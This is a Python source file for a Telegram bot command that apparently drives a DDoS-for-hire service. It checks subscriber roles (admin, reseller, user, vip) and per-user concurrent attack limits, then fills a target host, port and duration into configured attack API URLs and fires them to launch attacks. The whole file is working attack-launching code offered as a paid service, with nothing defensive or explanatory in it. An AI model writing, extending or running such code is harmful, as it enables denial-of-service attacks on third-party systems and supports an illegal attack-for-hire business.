import requests
from telegram.ext import ContextTypes

from core.utils.utils import *


@restricted(["admin", "reseller", "user", "vip"])
async def perform_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    users_data = load_users_data()
    attacks_config = load_attacks_config()
    user_id = str(update.effective_user.id)

    if "concurrent_attacks" in users_data[user_id]:
        concurrent_attacks = users_data[user_id]["concurrent_attacks"]
        user_ongoing_attacks = len(ongoing_attacks[user_id])
        if user_ongoing_attacks >= concurrent_attacks:
            await update.message.reply_text(
                f"You have reached your concurrent limit! ({user_ongoing_attacks}/{concurrent_attacks}).")
            return

    if len(context.args) != 4:
        await update.message.reply_text("use: /attack <host> <port> <duration> <method>")
        return

    host, port, duration, method = context.args
    method = method.lower()

    if method not in attacks_config:
        await update.message.reply_text(f"Method '{method}' does not exist.")
        return

    if not attacks_config[method].get("Enabled", False):
        await update.message.reply_text(f"Method '{method}' is currently disabled.")
        return

    allowed_roles = attacks_config[method].get("access", [])

    if "admin" not in users_data[user_id]["roles"] and "admin" not in allowed_roles:
        if method != "vip" and "vip" not in users_data[user_id]["roles"] and "vip" not in allowed_roles:
            await update.message.reply_text(f"Method '{method}' is not available for your role.")
            return

    if method in attacks_config:
        urls = attacks_config[method].get("urls", [])
        if not urls:
            await update.message.reply_text(f"No valid url's for '{method}'. Contact an admin")
            return

        for url_template in urls:
            api_url = url_template.replace("<host>", host).replace("<port>", port).replace("<duration>", duration)
            response = requests.get(api_url)

            if response.status_code != 200:
                await update.message.reply_text(f"Failed to initiate attack using method '{method}'.")
                return

            ongoing_attacks[user_id].append({
                "host": host,
                "port": port,
                "duration": int(duration),
                "start_time": time.time()
            })

    await update.message.reply_text("Attack initiated successfully.")